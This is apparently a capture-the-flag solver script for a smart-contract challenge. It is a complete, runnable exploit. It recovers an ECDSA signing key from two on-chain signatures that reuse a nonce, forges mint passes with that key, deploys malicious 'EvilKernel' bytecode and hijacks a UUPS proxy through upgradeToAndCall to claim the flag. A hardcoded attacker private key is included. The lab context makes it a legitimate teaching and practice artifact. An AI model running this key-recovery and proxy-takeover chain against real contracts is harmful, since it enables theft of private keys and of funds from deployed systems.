#!/usr/bin/env python3
"""
HAALAND v2 — solver (INSANE).

Chain of exploitation:

    1. GET /deployed.json -> proxy + signer + 2 promo addresses
    2. Scrape the two PassMinted tx's on-chain; pull the two 65-byte
       signatures.  Notice both share the same `r` -> ECDSA nonce reuse.
       Malleability (r, n-s) is also a valid bytes blob but is a red
       herring: the kernel's replay check is on (holder, nonce), not
       on sig hash alone — a malleated sig still fails because
       usedHolderNonce[keccak(holder || nonce)] is already set.
    3. Recover the signer private key via classical nonce-reuse algebra:
            k      = (m1 - m2) / (s1 - s2)  mod n
            priv   = (s1 * k - m1) / r      mod n
       where m1, m2 are the pass digests actually signed by the server.
    4. Use the recovered privkey to sign two fresh passes for the
       attacker's address with nonces 0 and 1, then mintPass both.
       Now passCount[attacker] == 2.
    5. Deploy EvilKernel (UUPS impl whose scoreGoldenBoot() emits
       GoldenBootClaimed(msg.sender)).
    6. Call upgradeToAndCall(evil, encodeCall(scoreGoldenBoot)) on the
       proxy; _authorizeUpgrade passes, delegatecall emits the event
       from the proxy address.
    7. GET /claim -> flag.

Usage:
    python3 solve.py [http://host:8080]
"""
from __future__ import annotations

import json
import os
import sys
from pathlib import Path
from urllib.parse import urlparse

import requests
from eth_account import Account
from eth_keys.main import KeyAPI
from eth_utils import keccak
from web3 import Web3

# ---- EvilKernel (compiled from solver/EvilKernel.sol) ----------------
EVIL_KERNEL_BYTECODE = "0x60a060405230608052348015610013575f80fd5b506080516106a561003a5f395f81816101400152818161016901526102dd01526106a55ff3fe60806040526004361061003e575f3560e01c80632d797b71146100425780634f1ef2861461005857806352d1902d1461006b578063ad3cb1cc14610092575b5f80fd5b34801561004d575f80fd5b506100566100cf565b005b610056610066366004610500565b6100fb565b348015610076575f80fd5b5061007f61011a565b6040519081526020015b60405180910390f35b34801561009d575f80fd5b506100c2604051806040016040528060058152602001640352e302e360dc1b81525081565b60405161008991906105eb565b60405133907f6b3d3ed24b647a2976c3f6b0daf5cdb6a0cb35e0ca950761cfa029a3a2ea1cf5905f90a2565b610103610135565b61010c826101db565b6101168282610211565b5050565b5f6101236102d2565b505f8051602061065083398151915290565b306001600160a01b037f00000000000000000000000000000000000000000000000000000000000000001614806101bb57507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03166101af5f80516020610650833981519152546001600160a01b031690565b6001600160a01b031614155b156101d95760405163703e46dd60e11b815260040160405180910390fd5b565b60405162461bcd60e51b8152602060048201526006602482015265333937bd32b760d11b60448201526064015b60405180910390fd5b816001600160a01b03166352d1902d6040518163ffffffff1660e01b8152600401602060405180830381865afa92505050801561026b575060408051601f3d908101601f191682019092526102689181019061061d565b60015b61029357604051634c9c8ce360e01b81526001600160a01b0383166004820152602401610208565b5f8051602061065083398151915281146102c357604051632a87526960e21b815260048101829052602401610208565b6102cd838361031b565b505050565b306001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146101d95760405163703e46dd60e11b815260040160405180910390fd5b61032482610370565b6040516001600160a01b038316907fbc7cd75a20ee27fd9adebab32041f755214dbc6bffa90cc0225b39da2e5c2d3b905f90a2805115610368576102cd82826103d3565b610116610445565b806001600160a01b03163b5f036103a557604051634c9c8ce360e01b81526001600160a01b0382166004820152602401610208565b5f8051602061065083398151915280546001600160a01b0319166001600160a01b0392909216919091179055565b60605f80846001600160a01b0316846040516103ef9190610634565b5f60405180830381855af49150503d805f8114610427576040519150601f19603f3d011682016040523d82523d5f602084013e61042c565b606091505b509150915061043c858383610464565b95945050505050565b34156101d95760405163b398979f60e01b815260040160405180910390fd5b60608261047957610474826104c3565b6104bc565b815115801561049057506001600160a01b0384163b155b156104b957604051639996b31560e01b81526001600160a01b0385166004820152602401610208565b50805b9392505050565b8051156104d35780518082602001fd5b604051630a12f52160e11b815260040160405180910390fd5b634e487b7160e01b5f52604160045260245ffd5b5f8060408385031215610511575f80fd5b82356001600160a01b0381168114610527575f80fd5b9150602083013567ffffffffffffffff80821115610543575f80fd5b818501915085601f830112610556575f80fd5b813581811115610568576105686104ec565b604051601f8201601f19908116603f01168101908382118183101715610590576105906104ec565b816040528281528860208487010111156105a8575f80fd5b826020860160208301375f6020848301015280955050505050509250929050565b5f5b838110156105e35781810151838201526020016105cb565b50505f910152565b602081525f82518060208401526106098160408501602087016105c9565b601f01601f19169190910160400192915050565b5f6020828403121561062d575f80fd5b5051919050565b5f82516106458184602087016105c9565b919091019291505056fe360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbca264697066735822122088626486c9f216aa3a8e27bba01a0e04df1d40b41128a918ff2bd032d80b5b5864736f6c63430008180033"

SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141


# --------------------------------------------------------------------- utils

def auto_urls(arg: str | None) -> tuple[str, str]:
    if arg:
        u = urlparse(arg)
        base = f"{u.scheme}://{u.netloc}"
    else:
        base = os.environ.get("TARGET", "http://127.0.0.1:8080")
    host = urlparse(base).hostname or "127.0.0.1"
    rpc_port = int(os.environ.get("RPC_PORT", "8545"))
    rpc_url = f"http://{host}:{rpc_port}"
    return base, rpc_url


def fetch_deployed(base: str) -> dict:
    r = requests.get(f"{base}/deployed.json", timeout=10)
    r.raise_for_status()
    return r.json()


def pass_digest(holder: bytes, nonce: int) -> bytes:
    assert len(holder) == 20
    return keccak(b"HAALAND_GB_PASS_V2" + holder + nonce.to_bytes(32, "big"))


def modinv(a: int, m: int) -> int:
    return pow(a % m, -1, m)


# --------------------------------------------------------------------- recon

def collect_promo_sigs(w3: Web3, proxy: str) -> list[dict]:
    """Pull the two promo PassMinted txs from the log and decode the
    full 65-byte signature out of each tx's calldata."""
    topic = "0x" + keccak(b"PassMinted(address,uint256,bytes)").hex()
    logs = w3.eth.get_logs({
        "fromBlock": 0,
        "toBlock": "latest",
        "address": Web3.to_checksum_address(proxy),
        "topics": [topic],
    })
    if len(logs) < 2:
        raise RuntimeError(f"expected >= 2 PassMinted logs, got {len(logs)}")

    out = []
    for log in logs:
        tx = w3.eth.get_transaction(log["transactionHash"])
        raw_input = tx["input"]
        data = bytes(raw_input) if isinstance(raw_input, (bytes, bytearray)) \
               else bytes.fromhex(raw_input.removeprefix("0x"))

        # mintPass(address holder, uint256 nonce, bytes sig)
        # ABI: selector (4) + addr (32) + nonce (32) + offset (32) + sig-length (32) + sig (65 padded)
        assert data[:4] == keccak(b"mintPass(address,uint256,bytes)")[:4]
        holder = "0x" + data[4 + 12:4 + 32].hex()   # right-aligned address
        nonce  = int.from_bytes(data[4 + 32:4 + 64], "big")
        sig_len = int.from_bytes(data[4 + 96:4 + 128], "big")
        assert sig_len == 65
        sig = data[4 + 128:4 + 128 + 65]

        out.append({
            "holder": Web3.to_checksum_address(holder),
            "nonce":  nonce,
            "sig":    sig,
        })
    return out


# ------------------------------------------------------------- key recovery

def recover_signer_priv(promos: list[dict], expected_signer: str) -> int:
    """Two (r, s, m) with the same r -> recover k, then priv.

    libsecp256k1 normalises s to low-s on signing, which may flip the
    parity relative to the signing equation.  We try all 4 sign
    combinations and pick the candidate that derives the known signer
    address.
    """
    assert len(promos) >= 2
    a, b = promos[0], promos[1]
    r = int.from_bytes(a["sig"][:32], "big")
    s1 = int.from_bytes(a["sig"][32:64], "big")
    s2 = int.from_bytes(b["sig"][32:64], "big")
    r2 = int.from_bytes(b["sig"][:32], "big")
    assert r == r2, "expected identical r values — no nonce reuse detected"

    m1 = int.from_bytes(pass_digest(bytes.fromhex(a["holder"][2:]), a["nonce"]), "big")
    m2 = int.from_bytes(pass_digest(bytes.fromhex(b["holder"][2:]), b["nonce"]), "big")

    n = SECP256K1_N
    kapi = KeyAPI()
    for s1_sign, s2_sign in ((1, 1), (1, -1), (-1, 1), (-1, -1)):
        ss1 = s1 if s1_sign > 0 else n - s1
        ss2 = s2 if s2_sign > 0 else n - s2
        try:
            k = ((m1 - m2) * modinv(ss1 - ss2, n)) % n
            d = ((ss1 * k - m1) * modinv(r, n)) % n
            if not (0 < d < n):
                continue
            addr = kapi.PrivateKey(d.to_bytes(32, "big")).public_key.to_checksum_address()
            if addr.lower() == expected_signer.lower():
                return d
        except Exception:
            continue
    raise RuntimeError("k-reuse recovery failed — is r really shared?")


# ------------------------------------------------------------------ sigs

def sign_pass(priv: int, holder: bytes, nonce: int) -> bytes:
    """Standard ECDSA sign of the pass digest — we're the signer now."""
    sk = KeyAPI().PrivateKey(priv.to_bytes(32, "big"))
    digest = pass_digest(holder, nonce)
    sig = KeyAPI().ecdsa_sign(digest, sk)
    r = sig.r.to_bytes(32, "big")
    s = sig.s.to_bytes(32, "big")
    v = (sig.v + 27).to_bytes(1, "big") if sig.v < 27 else sig.v.to_bytes(1, "big")
    return r + s + v


# ----------------------------------------------------------------- tx helpers

def build_mint_call(holder: bytes, nonce: int, sig: bytes) -> bytes:
    selector = keccak(b"mintPass(address,uint256,bytes)")[:4]
    addr    = b"\x00" * 12 + holder
    nonceB  = nonce.to_bytes(32, "big")
    offset  = (96).to_bytes(32, "big")       # offset to bytes tail, relative to head start
    length  = (65).to_bytes(32, "big")
    padded  = sig + b"\x00" * ((32 - len(sig) % 32) % 32)
    return selector + addr + nonceB + offset + length + padded


def build_upgrade_and_call(new_impl: str) -> bytes:
    selector = keccak(b"upgradeToAndCall(address,bytes)")[:4]
    addr = int(new_impl, 16).to_bytes(32, "big")
    inner = keccak(b"scoreGoldenBoot()")[:4]
    offset = (64).to_bytes(32, "big")
    length = len(inner).to_bytes(32, "big")
    padded = inner + b"\x00" * ((32 - len(inner) % 32) % 32)
    return selector + addr + offset + length + padded


def send_tx(w3: Web3, acct, to: str | None, data: bytes, gas: int = 2_500_000) -> str:
    tx = {
        "from":     acct.address,
        "to":       Web3.to_checksum_address(to) if to else None,
        "data":     "0x" + data.hex(),
        "gas":      gas,
        "gasPrice": w3.eth.gas_price,
        "nonce":    w3.eth.get_transaction_count(acct.address),
        "chainId":  w3.eth.chain_id,
    }
    signed = acct.sign_transaction(tx)
    raw = getattr(signed, "raw_transaction", None) or signed.rawTransaction
    h = w3.eth.send_raw_transaction(raw)
    rc = w3.eth.wait_for_transaction_receipt(h, timeout=60)
    if rc["status"] != 1:
        raise RuntimeError(f"tx reverted: {h.hex()}")
    return rc


# --------------------------------------------------------------------- main

def solve(base: str, rpc_url: str) -> str:
    w3 = Web3(Web3.HTTPProvider(rpc_url))
    assert w3.is_connected(), f"rpc not up: {rpc_url}"
    print(f"[*] connected, chain_id={w3.eth.chain_id}")

    deployed = fetch_deployed(base)
    proxy  = deployed["proxy"]
    signer = deployed["signer"]
    print(f"[*] proxy={proxy}  signer={signer}")

    promos = collect_promo_sigs(w3, proxy)
    print(f"[*] scraped {len(promos)} promo sigs")
    for p in promos:
        print(f"     holder={p['holder']} nonce={p['nonce']} sig={p['sig'].hex()[:40]}...")

    priv = recover_signer_priv(promos, signer)
    recovered_addr = KeyAPI().PrivateKey(priv.to_bytes(32, "big")).public_key.to_checksum_address()
    print(f"[*] recovered privkey = {priv:064x}")
    print(f"[*] recovered signer  = {recovered_addr}")

    ATTACKER_PK = "0x8b3a350cf5c34c9194ca85829a2df0ec3153be0318b5e2d3348e872092edffba"
    atk = Account.from_key(ATTACKER_PK)
    atk_bytes = bytes.fromhex(atk.address[2:])
    print(f"[*] attacker={atk.address}")

    for nonce in (0, 1):
        sig = sign_pass(priv, atk_bytes, nonce)
        print(f"[*] minting pass nonce={nonce} sig={sig.hex()[:40]}...")
        send_tx(w3, atk, proxy, build_mint_call(atk_bytes, nonce, sig))

    print("[*] deploying EvilKernel...")
    tx = {
        "from":     atk.address,
        "data":     EVIL_KERNEL_BYTECODE,
        "gas":      2_500_000,
        "gasPrice": w3.eth.gas_price,
        "nonce":    w3.eth.get_transaction_count(atk.address),
        "chainId":  w3.eth.chain_id,
    }
    signed = atk.sign_transaction(tx)
    raw = getattr(signed, "raw_transaction", None) or signed.rawTransaction
    h = w3.eth.send_raw_transaction(raw)
    rc = w3.eth.wait_for_transaction_receipt(h, timeout=60)
    assert rc["status"] == 1
    evil = rc["contractAddress"]
    print(f"[*] evil kernel at {evil}")

    print("[*] upgradeToAndCall to emit GoldenBootClaimed...")
    send_tx(w3, atk, proxy, build_upgrade_and_call(evil))

    print("[*] fetching /claim ...")
    r = requests.get(f"{base}/claim", timeout=15)
    data = r.json()
    print(f"[*] claim resp: {json.dumps(data)[:200]}")
    return data.get("flag", "")


def main() -> int:
    target = sys.argv[1] if len(sys.argv) > 1 else None
    base, rpc = auto_urls(target)
    flag = solve(base, rpc)
    if flag:
        print(f"\nFLAG: {flag}")
        return 0
    print("\n[!] no flag in response", file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
